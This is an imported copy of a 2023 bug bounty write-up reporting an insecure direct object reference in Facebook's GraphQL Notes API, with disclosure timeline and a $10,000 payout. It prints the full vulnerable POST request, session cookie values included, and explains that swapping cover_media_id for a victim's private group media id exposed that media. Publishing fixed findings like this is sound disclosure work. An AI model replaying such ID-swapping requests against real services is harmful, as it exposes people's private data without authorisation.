---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-31_how-i-could-view-any-facebook-groups-notes-media-and-they-paid-me-a-10000.md
original_filename: 2023-08-31_how-i-could-view-any-facebook-groups-notes-media-and-they-paid-me-a-10000.md
title: How I could view any Facebook Groups Notes media, and they paid me a $10,000
category: notes
detected_topics:
- idor
- command-injection
- otp
- graphql
tags:
- imported
- notes
- idor
- command-injection
- otp
- graphql
language: en
raw_sha256: b1710476372d23ca00ab92385bf1089acea7b84a6100a14cc6b52b72a75945b6
text_sha256: 5f7d1f741fc9916309de4fb02cbc9c7c39b0bd4845bdb085bb8c37719191422c
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: true
---

# How I could view any Facebook Groups Notes media, and they paid me a $10,000

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-31_how-i-could-view-any-facebook-groups-notes-media-and-they-paid-me-a-10000.md
- Source Type: markdown
- Detected Topics: idor, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: True
- Raw SHA256: `b1710476372d23ca00ab92385bf1089acea7b84a6100a14cc6b52b72a75945b6`
- Text SHA256: `5f7d1f741fc9916309de4fb02cbc9c7c39b0bd4845bdb085bb8c37719191422c`


## Content

---
title: "How I could view any Facebook Groups Notes media, and they paid me a $10,000"
url: "https://medium.com/@rajasudhakar/how-i-could-view-any-facebook-groups-notes-media-and-they-paid-me-a-10-000-fe22f8949d7c"
authors: ["Raja Sudhakar (@Rajasudhakar)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR"]
bounty: "10,000"
publication_date: "2023-08-31"
added_date: "2023-09-05"
source: "pentester.land/writeups.json"
original_index: 818
scraped_via: "browseros"
---

# How I could view any Facebook Groups Notes media, and they paid me a $10,000

How I could view any Facebook Groups Notes media, and they paid me a $10,000
Raja Sudhakar
Follow
2 min read
·
Aug 31, 2023

501

7

Press enter or click to view image in full size

Hi, This is Raja Sudhakar from Coimbatore, Tamil Nadu. I am freedom security researcher. This post is about a vulnerability I discovered on Facebook which I could view any Facebook Groups Notes media. Facebook acknowledged the issue promptly, fixed it, and rewarded me with a US $10,000 bounty based on the severity and impact of this vulnerability

About Facebook Notes

Facebook that allowed users to write and publish longer-form content, similar to blog posts or articles. It was introduced as a way to share more detailed and substantial content compared to regular status updates or short posts. Facebook Notes allowed users to create rich-text posts with formatting options such as headings, bullet points, images, and hyperlinks.

Vulnerability Type :

IDOR (Insecure Direct Object References)

Get Raja Sudhakar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Reference: https://www.owasp.org/index.php/Top_10_2010-A4-Insecure_Direct_Object_References

Vulnerable Request
POST /api/graphql/ HTTP/2
Host: www.facebook.com
Cookie: sb=AI6rZMwnqkTXORscLvl-6exQ; dpr=2; datr=AI6rZKHF74ih8Kwg3W7AqugP; c_user=100007305343287; wd=1600x881; m_page_voice=100079998952942;

------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="__hs"

2
------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="__ccg"

15
------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="fb_dtsg"

RelayModern
------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="fb_api_req_friendly_name"

usePaperCreateDocumentVersionForLexical_Mutation
------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="variables"

{"connections":["client:1081791239468083:__PaperDocumentVersionHistoryPanel__documentVersions_connection"],"input":{"client_mutation_id":"16","actor_id":"100007305343287","document_case_id":"1081791239468083","source_payload":{"cover_media_id":"3566344510300190","cover_media_offset_y":0,"media_ids":[],"payload":"{\"root\":{\"children\":[{\"children\":[{\"detail\":0,\"format\":0,\"mode\":\"normal\",\"style\":\"\",\"text\":\"qwerty\",\"type\":\"text\",\"version\":1}],\"direction\":\"ltr\",\"format\":\"\",\"indent\":0,\"type\":\"paragraph\",\"version\":1}],\"direction\":\"ltr\",\"format\":\"\",\"indent\":0,\"type\":\"root\",\"version\":1}}","subtitle":"","title":"Attacker Note"},"version":10}}
------***REDACTED-SUSPECT-TOKEN***Content-Disposition: form-data; name="server_timestamps"

true

Replacing the cover_media_id with the victim’s private group media id in the above request led to view victim media.

Proof Of Concept Video:
Disclosure Timeline

13 July 2023 at 14:20 : Report sent to Facebook Security team

13 July 2023 at 20:46 : Bug acknowledged by Facebook Security team

19 July 2023 at 17:36 : Vulnerability Fixed

26 July 2023 at 19:54 : Bounty of $10000 awarded by Facebook

Press enter or click to view image in full size

Thanks to the Facebook security team for quickly fixing the issue.

Note: This is being published with the permission of Facebook under the responsible disclosure policy. The vulnerability is now fixed.
